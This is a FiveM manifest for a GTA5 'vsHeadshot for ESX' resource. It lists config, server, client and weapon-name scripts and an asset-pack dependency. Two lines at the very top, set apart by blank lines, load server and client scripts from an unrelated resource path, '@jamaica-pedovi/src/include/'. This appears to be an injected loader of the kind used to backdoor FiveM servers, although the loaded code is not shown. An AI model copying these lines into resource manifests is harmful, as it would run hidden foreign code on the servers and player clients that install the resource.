server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version 'cerulean'

game 'gta5'

author '[VS]Yannik'
description 'vsHeadshot for ESX'
version '3.0.0'

lua54 'yes'

server_scripts {
	'config.lua',
	'server.lua',
	'weaponNames.lua'
}

client_scripts {
	'config.lua',
	'client.lua',
	'weaponNames.lua'
}

escrow_ignore {
	'config.lua',
	'weaponNames.lua'
}

dependencies {
	'/onesync',
}

dependency '/assetpacks'